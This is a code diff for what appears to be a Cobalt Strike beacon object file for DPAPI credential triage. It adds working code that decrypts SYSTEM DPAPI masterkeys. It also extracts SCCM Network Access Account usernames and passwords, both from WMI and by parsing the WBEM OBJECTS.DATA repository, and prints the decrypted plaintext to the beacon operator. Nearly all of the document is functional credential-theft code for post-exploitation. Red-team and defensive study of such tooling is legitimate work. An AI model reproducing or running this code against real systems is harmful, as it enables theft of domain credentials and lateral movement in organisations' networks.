@@ -9,6 +9,31 @@
 #include "lsadump.h"
 #include "bkrp.h"
 #include "beacon.h"
+#ifndef COBJMACROS
+#define COBJMACROS
+#endif
+#include <objbase.h>
+#include <oleauto.h>
+#include <wbemcli.h>
+
+#ifdef BOF
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
+DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
+DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
+DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
+DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);
+#endif
+
+static const CLSID SCCM_WBEM_LOCATOR_CLSID = {
+    0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
+};
+
+static const IID SCCM_IID_WBEM_LOCATOR = {
+    0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
+};
 
 /* ---- Internal: read file into buffer ---- */
 static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) {
@@ -16,7 +41,9 @@ static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) 
     DWORD size, read;
 
 #ifdef BOF
-    hFile = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+    hFile = KERNEL32$CreateFileW(path, GENERIC_READ,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                                  NULL,
                                   OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
@@ -38,7 +65,9 @@ static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) 
 
     KERNEL32$CloseHandle(hFile);
 #else
-    hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+    hFile = CreateFileW(path, GENERIC_READ,
+                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                         NULL,
                          OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
 
@@ -158,9 +187,78 @@ typedef struct {
     int decrypted;
 } MK_TRIAGE_CTX;
 
+static BOOL guid_from_masterkey_path(const wchar_t* path, GUID* guid) {
+    if (!path || !guid) return FALSE;
+
+    const wchar_t* base = path;
+    for (const wchar_t* p = path; *p; p++) {
+        if (*p == L'\\' || *p == L'/') base = p + 1;
+    }
+
+    int len = (int)wcslen(base);
+    if (len != 36 && len != 38) return FALSE;
+
+    char tmp[40];
+    memset(tmp, 0, sizeof(tmp));
+    for (int i = 0; i < len; i++) {
+        wchar_t c = base[i];
+        if (c > 0x7f) return FALSE;
+        tmp[i] = (char)c;
+    }
+
+    return string_to_guid(tmp, guid);
+}
+
+static BOOL is_plausible_masterkey_blob(const BYTE* mk_bytes, int mk_len) {
+    if (!mk_bytes || mk_len < 96) return FALSE;
+
+    DWORD version = *(DWORD*)(mk_bytes + 0);
+    if (version == 0 || version > 5) return FALSE;
+
+    int offset = 20; /* version + 16-byte salt */
+    if (offset + 12 > mk_len) return FALSE;
+
+    DWORD rounds = *(DWORD*)(mk_bytes + offset); offset += 4;
+    DWORD alg_hash = *(DWORD*)(mk_bytes + offset); offset += 4;
+    DWORD alg_crypt = *(DWORD*)(mk_bytes + offset);
+
+    if (rounds == 0 || rounds > 10000000) return FALSE;
+    if (alg_hash != CALG_SHA1 && alg_hash != CALG_HMAC && alg_hash != CALG_SHA_512)
+        return FALSE;
+    if (alg_crypt != CALG_3DES && alg_crypt != CALG_3DES_112 && alg_crypt != CALG_AES_256)
+        return FALSE;
+
+    return TRUE;
+}
+
+static void print_masterkey_debug(const wchar_t* path, const BYTE* mk_bytes, int mk_len,
+                                  BOOL raw_machine_ok, BOOL raw_user_ok,
+                                  BOOL shifted_machine_ok, BOOL shifted_user_ok) {
+    if (!path || !mk_bytes || mk_len < 32) return;
+
+    DWORD version = *(DWORD*)(mk_bytes + 0);
+    DWORD rounds = *(DWORD*)(mk_bytes + 20);
+    DWORD alg_hash = *(DWORD*)(mk_bytes + 24);
+    DWORD alg_crypt = *(DWORD*)(mk_bytes + 28);
+
+    char* path_utf8 = wide_to_utf8(path);
+    BeaconPrintf(CALLBACK_OUTPUT,
+                 "    [mkdbg] path=%s ver=%u rounds=%u hash=0x%08x crypt=0x%08x rawM=%s rawU=%s shM=%s shU=%s\n",
+                 path_utf8 ? path_utf8 : "?",
+                 version, rounds, alg_hash, alg_crypt,
+                 raw_machine_ok ? "ok" : "fail",
+                 raw_user_ok ? "ok" : "fail",
+                 shifted_machine_ok ? "ok" : "fail",
+                 shifted_user_ok ? "ok" : "fail");
+    if (path_utf8) intFree(path_utf8);
+}
+
 /* ---- Callback: process a single masterkey file ---- */
 static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
     MK_TRIAGE_CTX* tc = (MK_TRIAGE_CTX*)ctx;
+    GUID file_guid;
+    if (!guid_from_masterkey_path(path, &file_guid)) return;
+
     BYTE* data = NULL;
     int data_len = 0;
 
@@ -180,6 +278,15 @@ static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
         return;
     }
 
+    if (!is_plausible_masterkey_blob(mk_bytes, mk_len)) {
+        if (mk_bytes) intFree(mk_bytes);
+        if (bk_bytes) intFree(bk_bytes);
+        if (dk_bytes) intFree(dk_bytes);
+        intFree(data);
+        return;
+    }
+    memcpy(&mk_guid, &file_guid, sizeof(GUID));
+
     if (tc->hashes_only && mk_bytes) {
         /* Output hash format only */
         char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
@@ -196,6 +303,50 @@ static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
     /* Try to decrypt with each available key */
     BYTE sha1[20];
     BOOL decrypted = FALSE;
+    BOOL raw_machine_ok = FALSE;
+    BOOL raw_user_ok = FALSE;
+    BOOL shifted_machine_ok = FALSE;
+    BOOL shifted_user_ok = FALSE;
+
+    /* Try raw 40-byte DPAPI_SYSTEM machine/user key layout first */
+    if (!decrypted && tc->pvk && tc->pvk_len >= 40 &&
+        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
+        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
+                                       tc->pvk, 20,
+                                       sha1)) {
+            decrypted = TRUE;
+            raw_machine_ok = TRUE;
+        }
+    }
+    if (!decrypted && tc->pvk && tc->pvk_len >= 40 &&
+        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
+        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
+                                       tc->pvk + 20, 20,
+                                       sha1)) {
+            decrypted = TRUE;
+            raw_user_ok = TRUE;
+        }
+    }
+
+    /* Also try a 4-byte-prefixed layout if present */
+    if (!decrypted && tc->pvk && tc->pvk_len >= 44 &&
+        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
+        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
+                                       tc->pvk + 4, 20,
+                                       sha1)) {
+            decrypted = TRUE;
+            shifted_machine_ok = TRUE;
+        }
+    }
+    if (!decrypted && tc->pvk && tc->pvk_len >= 44 &&
+        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
+        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
+                                       tc->pvk + 24, 20,
+                                       sha1)) {
+            decrypted = TRUE;
+            shifted_user_ok = TRUE;
+        }
+    }
 
     /* Try PVK (domain backup key) first */
     if (!decrypted && tc->pvk && tc->pvk_len > 0 && dk_bytes && dk_len > 0) {
@@ -276,6 +427,10 @@ static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
         }
         if (guid_str) intFree(guid_str);
         if (sha1_hex) intFree(sha1_hex);
+    } else if (tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
+        print_masterkey_debug(path, mk_bytes, mk_len,
+                              raw_machine_ok, raw_user_ok,
+                              shifted_machine_ok, shifted_user_ok);
     }
 
     if (mk_bytes) intFree(mk_bytes);
@@ -443,11 +598,13 @@ BOOL triage_system_masterkeys(MASTERKEY_CACHE* cache) {
     MK_TRIAGE_CTX ctx;
     memset(&ctx, 0, sizeof(ctx));
     ctx.cache = cache;
-    /* For system masterkeys, the key is the HMAC-SHA1 of DPAPI_SYSTEM key */
     ctx.pvk = dpapi_key;
     ctx.pvk_len = key_len;
+    ctx.sid = "S-1-5-18";
 
     enumerate_files(system_path, NULL, triage_masterkey_file_cb, &ctx);
+    wchar_t system_user_path[] = L"C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User";
+    enumerate_files(system_user_path, NULL, triage_masterkey_file_cb, &ctx);
 
     intFree(dpapi_key);
 
@@ -719,9 +876,550 @@ BOOL triage_search(MASTERKEY_CACHE* cache,
     return FALSE;
 }
 
+static int find_bytes(const BYTE* data, int data_len,
+                      int start, const BYTE* needle, int needle_len) {
+    if (!data || !needle || data_len <= 0 || needle_len <= 0 || start < 0) return -1;
+    if (start + needle_len > data_len) return -1;
+    for (int i = start; i + needle_len <= data_len; i++) {
+        if (memcmp(data + i, needle, needle_len) == 0) return i;
+    }
+    return -1;
+}
+
+static char* extract_ascii(const BYTE* data, int start, int end) {
+    if (!data || start < 0 || end < start) return NULL;
+    int len = end - start;
+    if (len <= 0 || len > 16384) return NULL;
+    char* out = (char*)intAlloc(len + 1);
+    if (!out) return NULL;
+    memcpy(out, data + start, len);
+    out[len] = 0;
+    return out;
+}
+
+static BOOL is_hex_char(char c) {
+    return ((c >= '0' && c <= '9') ||
+            (c >= 'a' && c <= 'f') ||
+            (c >= 'A' && c <= 'F'));
+}
+
+static char* extract_longest_hex_blob(const char* text) {
+    int best_start = -1;
+    int best_len = 0;
+    int run_start = -1;
+    int run_len = 0;
+
+    if (!text) return NULL;
+
+    for (int i = 0;; i++) {
+        char c = text[i];
+        if (is_hex_char(c)) {
+            if (run_len == 0) run_start = i;
+            run_len++;
+        } else {
+            int candidate_len = run_len - (run_len % 2);
+            if (candidate_len >= 16 && candidate_len > best_len) {
+                best_start = run_start;
+                best_len = candidate_len;
+            }
+            run_start = -1;
+            run_len = 0;
+            if (c == '\0') break;
+        }
+    }
+
+    if (best_start < 0 || best_len <= 0) return NULL;
+    return extract_ascii((const BYTE*)text, best_start, best_start + best_len);
+}
+
+static char* extract_wmi_policy_secret_hex(const wchar_t* value) {
+    char* utf8 = NULL;
+    char* hex = NULL;
+
+    if (!value) return NULL;
+
+    utf8 = wide_to_utf8(value);
+    if (!utf8) return NULL;
+
+    hex = extract_longest_hex_blob(utf8);
+    intFree(utf8);
+    return hex;
+}
+
+static BOOL looks_like_utf16le(const BYTE* data, int data_len) {
+    if (!data || data_len < 4 || (data_len % 2) != 0) return FALSE;
+
+    int pairs = data_len / 2;
+    int high_zero = 0;
+    int printable = 0;
+
+    for (int i = 0; i < data_len; i += 2) {
+        BYTE lo = data[i];
+        BYTE hi = data[i + 1];
+        if (hi == 0) high_zero++;
+        if ((lo >= 0x20 && lo <= 0x7E) || lo == 0x09 || lo == 0x0A || lo == 0x0D)
+            printable++;
+    }
+
+    return (high_zero >= (pairs * 6 / 10)) && (printable > 0);
+}
+
+static void print_secret_value(const char* label, const BYTE* data, int data_len) {
+    if (!label || !data || data_len <= 0) return;
+
+    int utf16_len = data_len;
+    while (utf16_len >= 2 &&
+           data[utf16_len - 2] == 0 &&
+           data[utf16_len - 1] == 0) {
+        utf16_len -= 2;
+    }
+
+    if (utf16_len > 0 &&
+        (utf16_len % 2) == 0 &&
+        looks_like_utf16le(data, utf16_len)) {
+        wchar_t* wtmp = (wchar_t*)intAlloc(utf16_len + sizeof(wchar_t));
+        if (wtmp) {
+            memcpy(wtmp, data, utf16_len);
+            wtmp[utf16_len / 2] = L'\0';
+            char* utf8 = wide_to_utf8(wtmp);
+            if (utf8) {
+                BeaconPrintf(CALLBACK_OUTPUT, "    %s : %s\n", label, utf8);
+                intFree(utf8);
+                intFree(wtmp);
+                return;
+            }
+            intFree(wtmp);
+        }
+    }
+
+    int trimmed = data_len;
+    while (trimmed > 0 && data[trimmed - 1] == 0) trimmed--;
+    if (trimmed <= 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "    %s : <empty>\n", label);
+        return;
+    }
+
+    char* hex = bytes_to_hex(data, trimmed);
+    if (hex) {
+        BeaconPrintf(CALLBACK_OUTPUT, "    %s (hex) : %s\n", label, hex);
+        intFree(hex);
+    }
+}
+
+static BOOL is_sccm_machine_account_value(const BYTE* data, int data_len) {
+    static const BYTE marker[] = { 0x00, 0x00, 0x0E, 0x0E, 0x0E };
+
+    if (!data || data_len < (int)sizeof(marker)) return FALSE;
+    return (memcmp(data, marker, sizeof(marker)) == 0);
+}
+
+static BOOL decrypt_sccm_secret_hex(const char* secret_hex,
+                                    MASTERKEY_CACHE* cache,
+                                    BYTE** out_data, int* out_len) {
+    if (!secret_hex || !out_data || !out_len) return FALSE;
+    *out_data = NULL;
+    *out_len = 0;
+
+    int hex_len = (int)strlen(secret_hex);
+    if (hex_len < 16 || (hex_len % 2) != 0 || hex_len > (1024 * 1024)) return FALSE;
+    for (int i = 0; i < hex_len; i++) {
+        char c = secret_hex[i];
+        BOOL is_hex = ((c >= '0' && c <= '9') ||
+                       (c >= 'a' && c <= 'f') ||
+                       (c >= 'A' && c <= 'F'));
+        if (!is_hex) return FALSE;
+    }
+
+    int raw_len = 0;
+    BYTE* raw = hex_to_bytes(secret_hex, &raw_len);
+    if (!raw || raw_len <= 0) return FALSE;
+
+    /* Prefer local DPAPI unprotect for on-host SCCM secrets. */
+    for (int candidate = 0; candidate < 2; candidate++) {
+        int off = (candidate == 0) ? 4 : 0;
+        int len = raw_len - off;
+        if (len < 44) continue;
+        const BYTE* p = raw + off;
+        if (*(DWORD*)p != 1) continue;
+        if (!(p[4] == 0xD0 && p[5] == 0x8C && p[6] == 0x9D && p[7] == 0xDF)) continue;
+
+        DATA_BLOB in;
+        DATA_BLOB out;
+        memset(&in, 0, sizeof(in));
+        memset(&out, 0, sizeof(out));
+        in.pbData = (BYTE*)p;
+        in.cbData = (DWORD)len;
+
+#ifdef BOF
+        if (CRYPT32$CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
+            out.pbData && out.cbData > 0) {
+            BYTE* copied = (BYTE*)intAlloc(out.cbData);
+            if (copied) {
+                memcpy(copied, out.pbData, out.cbData);
+                *out_data = copied;
+                *out_len = (int)out.cbData;
+                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
+                intFree(raw);
+                return TRUE;
+            }
+            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, out.pbData);
+        }
+#else
+        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out) &&
+            out.pbData && out.cbData > 0) {
+            BYTE* copied = (BYTE*)intAlloc(out.cbData);
+            if (copied) {
+                memcpy(copied, out.pbData, out.cbData);
+                *out_data = copied;
+                *out_len = (int)out.cbData;
+                HeapFree(GetProcessHeap(), 0, out.pbData);
+                intFree(raw);
+                return TRUE;
+            }
+            HeapFree(GetProcessHeap(), 0, out.pbData);
+        }
+#endif
+    }
+
+    BOOL ok = FALSE;
+    DPAPI_BLOB blob;
+    memset(&blob, 0, sizeof(blob));
+
+    const BYTE* dpapi_ptr = raw;
+    int dpapi_len = raw_len;
+    BOOL parsed = FALSE;
+
+    if (raw_len > 4) {
+        dpapi_ptr = raw + 4;
+        dpapi_len = raw_len - 4;
+        parsed = parse_dpapi_blob(dpapi_ptr, dpapi_len, &blob);
+    }
+
+    if (!parsed) {
+        dpapi_ptr = raw;
+        dpapi_len = raw_len;
+        parsed = parse_dpapi_blob(dpapi_ptr, dpapi_len, &blob);
+    }
+
+    if (parsed) {
+        BYTE* mk_sha1 = cache ? mk_cache_lookup(cache, &blob.masterkey_guid) : NULL;
+        if (mk_sha1) {
+                ok = decrypt_blob(blob.data, blob.data_len,
+                                  blob.salt, blob.salt_len,
+                                  mk_sha1, 20,
+                                  blob.alg_crypt, blob.alg_hash,
+                                  out_data, out_len);
+        }
+        free_dpapi_blob(&blob);
+    }
+
+    intFree(raw);
+    return ok;
+}
+
+static int triage_sccm_secret(const char* label,
+                              const char* protected_hex,
+                              MASTERKEY_CACHE* cache,
+                              BOOL* machine_account) {
+    BYTE* decrypted = NULL;
+    int decrypted_len = 0;
+    BOOL ok = FALSE;
+
+    if (!label) return 0;
+
+    if (!protected_hex) {
+        BeaconPrintf(CALLBACK_OUTPUT, "    [!] %s blob was not found\n", label);
+        return 0;
+    }
+
+    ok = decrypt_sccm_secret_hex(protected_hex, cache, &decrypted, &decrypted_len);
+    if (ok) {
+        print_secret_value(label, decrypted, decrypted_len);
+        if (machine_account && is_sccm_machine_account_value(decrypted, decrypted_len)) {
+            *machine_account = TRUE;
+        }
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Failed to decrypt %s blob\n", label);
+    }
+
+    if (decrypted) intFree(decrypted);
+    return ok ? 1 : 0;
+}
+
+BOOL triage_sccm_wmi(void) {
+    static const wchar_t namespace_path[] = L"ROOT\\ccm\\policy\\Machine\\ActualConfig";
+    static const wchar_t query_text[] =
+        L"SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount";
+
+    HRESULT hr;
+    BOOL com_initialized = FALSE;
+    BOOL result = FALSE;
+    IWbemLocator* locator = NULL;
+    IWbemServices* services = NULL;
+    IEnumWbemClassObject* enumerator = NULL;
+    BSTR ns = NULL;
+    BSTR lang = NULL;
+    BSTR query = NULL;
+    int accounts = 0;
+    int decrypted = 0;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source: WMI %S\n", namespace_path);
+
+#ifdef BOF
+    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
+#else
+    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+#endif
+    if (SUCCEEDED(hr)) {
+        com_initialized = TRUE;
+    } else if (hr != RPC_E_CHANGED_MODE) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeEx failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+#ifdef BOF
+    hr = OLE32$CoInitializeSecurity(NULL, -1, NULL, NULL,
+                                    RPC_C_AUTHN_LEVEL_DEFAULT,
+                                    RPC_C_IMP_LEVEL_IMPERSONATE,
+                                    NULL, EOAC_NONE, NULL);
+#else
+    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
+                              RPC_C_AUTHN_LEVEL_DEFAULT,
+                              RPC_C_IMP_LEVEL_IMPERSONATE,
+                              NULL, EOAC_NONE, NULL);
+#endif
+    if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] CoInitializeSecurity failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+#ifdef BOF
+    hr = OLE32$CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
+                                &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
+#else
+    hr = CoCreateInstance(&SCCM_WBEM_LOCATOR_CLSID, NULL, CLSCTX_INPROC_SERVER,
+                          &SCCM_IID_WBEM_LOCATOR, (LPVOID*)&locator);
+#endif
+    if (FAILED(hr) || !locator) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] CoCreateInstance(IWbemLocator) failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+#ifdef BOF
+    ns = OLEAUT32$SysAllocString(namespace_path);
+    lang = OLEAUT32$SysAllocString(L"WQL");
+    query = OLEAUT32$SysAllocString(query_text);
+#else
+    ns = SysAllocString(namespace_path);
+    lang = SysAllocString(L"WQL");
+    query = SysAllocString(query_text);
+#endif
+    if (!ns || !lang || !query) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to allocate WMI query strings\n");
+        goto cleanup;
+    }
+
+    hr = IWbemLocator_ConnectServer(locator, ns, NULL, NULL, NULL, 0, NULL, NULL, &services);
+    if (FAILED(hr) || !services) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] IWbemLocator::ConnectServer failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+#ifdef BOF
+    hr = OLE32$CoSetProxyBlanket((IUnknown*)services,
+                                 RPC_C_AUTHN_WINNT,
+                                 RPC_C_AUTHZ_NONE,
+                                 NULL,
+                                 RPC_C_AUTHN_LEVEL_CALL,
+                                 RPC_C_IMP_LEVEL_IMPERSONATE,
+                                 NULL,
+                                 EOAC_NONE);
+#else
+    hr = CoSetProxyBlanket((IUnknown*)services,
+                           RPC_C_AUTHN_WINNT,
+                           RPC_C_AUTHZ_NONE,
+                           NULL,
+                           RPC_C_AUTHN_LEVEL_CALL,
+                           RPC_C_IMP_LEVEL_IMPERSONATE,
+                           NULL,
+                           EOAC_NONE);
+#endif
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] CoSetProxyBlanket failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+    hr = IWbemServices_ExecQuery(services, lang, query,
+                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+                                 NULL, &enumerator);
+    if (FAILED(hr) || !enumerator) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] IWbemServices::ExecQuery failed: 0x%08lx\n", hr);
+        goto cleanup;
+    }
+
+    for (;;) {
+        IWbemClassObject* object = NULL;
+        ULONG returned = 0;
+        VARIANT username_value;
+        VARIANT password_value;
+        char* user_hex = NULL;
+        char* pass_hex = NULL;
+        BOOL machine_account = FALSE;
+
+        memset(&username_value, 0, sizeof(username_value));
+        memset(&password_value, 0, sizeof(password_value));
+
+        hr = IEnumWbemClassObject_Next(enumerator, WBEM_INFINITE, 1, &object, &returned);
+        if (FAILED(hr)) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] IEnumWbemClassObject::Next failed: 0x%08lx\n", hr);
+            break;
+        }
+        if (returned == 0 || !object) break;
+
+        accounts++;
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
+
+        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessUsername", 0, &username_value, NULL, NULL)) &&
+            V_VT(&username_value) == VT_BSTR && V_BSTR(&username_value)) {
+            user_hex = extract_wmi_policy_secret_hex(V_BSTR(&username_value));
+        }
+
+        if (SUCCEEDED(IWbemClassObject_Get(object, L"NetworkAccessPassword", 0, &password_value, NULL, NULL)) &&
+            V_VT(&password_value) == VT_BSTR && V_BSTR(&password_value)) {
+            pass_hex = extract_wmi_policy_secret_hex(V_BSTR(&password_value));
+        }
+
+        decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, NULL, &machine_account);
+        decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, NULL, &machine_account);
+
+        if (machine_account) {
+            BeaconPrintf(CALLBACK_OUTPUT,
+                         "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
+        }
+
+        if (user_hex) intFree(user_hex);
+        if (pass_hex) intFree(pass_hex);
+#ifdef BOF
+        OLEAUT32$VariantClear(&username_value);
+        OLEAUT32$VariantClear(&password_value);
+#else
+        VariantClear(&username_value);
+        VariantClear(&password_value);
+#endif
+        IWbemClassObject_Release(object);
+    }
+
+    if (accounts == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries in WMI\n");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "\n[*] SCCM WMI triage complete: %d account entries, %d decrypted secrets\n",
+                     accounts, decrypted);
+    }
+
+    result = (decrypted > 0);
+
+cleanup:
+    if (enumerator) IEnumWbemClassObject_Release(enumerator);
+    if (services) IWbemServices_Release(services);
+    if (locator) IWbemLocator_Release(locator);
+#ifdef BOF
+    if (query) OLEAUT32$SysFreeString(query);
+    if (lang) OLEAUT32$SysFreeString(lang);
+    if (ns) OLEAUT32$SysFreeString(ns);
+    if (com_initialized) OLE32$CoUninitialize();
+#else
+    if (query) SysFreeString(query);
+    if (lang) SysFreeString(lang);
+    if (ns) SysFreeString(ns);
+    if (com_initialized) CoUninitialize();
+#endif
+
+    return result;
+}
+
 BOOL triage_sccm(MASTERKEY_CACHE* cache, const wchar_t* target) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM credential triage (not yet implemented)\n");
-    return FALSE;
+
+    const wchar_t* objects_path = target;
+    wchar_t default_path[] = L"C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA";
+    if (!objects_path || wcslen(objects_path) == 0) {
+        objects_path = default_path;
+    }
+
+    char* path_utf8 = wide_to_utf8(objects_path);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] SCCM source file: %s\n", path_utf8 ? path_utf8 : "?");
+    if (path_utf8) intFree(path_utf8);
+
+    BYTE* data = NULL;
+    int data_len = 0;
+    if (!read_file_bytes(objects_path, &data, &data_len)) {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read SCCM OBJECTS.DATA (Win32: %lu)\n",
+                     KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    const BYTE class_tag[] = "CCM_NetworkAccessAccount";
+    const BYTE policy_open[] = "<PolicySecret Version=\"1\"><![CDATA[";
+    const BYTE cdata_close[] = "]]>";
+
+    int pos = 0;
+    int accounts = 0;
+    int decrypted = 0;
+
+    while (pos < data_len) {
+        int class_pos = find_bytes(data, data_len, pos, class_tag, (int)(sizeof(class_tag) - 1));
+        if (class_pos < 0) break;
+
+        int open1 = find_bytes(data, data_len, class_pos, policy_open, (int)(sizeof(policy_open) - 1));
+        int close1 = (open1 >= 0)
+            ? find_bytes(data, data_len, open1 + (int)(sizeof(policy_open) - 1), cdata_close, (int)(sizeof(cdata_close) - 1))
+            : -1;
+        int open2 = (close1 >= 0)
+            ? find_bytes(data, data_len, close1 + (int)(sizeof(cdata_close) - 1), policy_open, (int)(sizeof(policy_open) - 1))
+            : -1;
+        int close2 = (open2 >= 0)
+            ? find_bytes(data, data_len, open2 + (int)(sizeof(policy_open) - 1), cdata_close, (int)(sizeof(cdata_close) - 1))
+            : -1;
+
+        if (open1 < 0 || close1 < 0 || open2 < 0 || close2 < 0) {
+            pos = class_pos + (int)(sizeof(class_tag) - 1);
+            continue;
+        }
+
+        char* user_hex = extract_ascii(data,
+            open1 + (int)(sizeof(policy_open) - 1), close1);
+        char* pass_hex = extract_ascii(data,
+            open2 + (int)(sizeof(policy_open) - 1), close2);
+
+        accounts++;
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging SCCM Network Access Account #%d\n", accounts);
+
+        if (user_hex && pass_hex) {
+            BOOL machine_account = FALSE;
+            decrypted += triage_sccm_secret("Plaintext NAA Username", user_hex, cache, &machine_account);
+            decrypted += triage_sccm_secret("Plaintext NAA Password", pass_hex, cache, &machine_account);
+            if (machine_account) {
+                BeaconPrintf(CALLBACK_OUTPUT,
+                             "    [!] SCCM is configured to use the client's machine account instead of an NAA\n");
+            }
+        }
+
+        if (user_hex) intFree(user_hex);
+        if (pass_hex) intFree(pass_hex);
+
+        pos = close2 + (int)(sizeof(cdata_close) - 1);
+    }
+
+    if (accounts == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found 0 SCCM Network Access Account entries\n");
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "\n[*] SCCM triage complete: %d account entries, %d decrypted secrets\n",
+            accounts, decrypted);
+    }
+
+    intFree(data);
+    return (decrypted > 0);
 }
 
 BOOL triage_user_full(MASTERKEY_CACHE* cache,
@@ -750,4 +1448,3 @@ BOOL triage_user_full(MASTERKEY_CACHE* cache,
 
     return TRUE;
 }
-
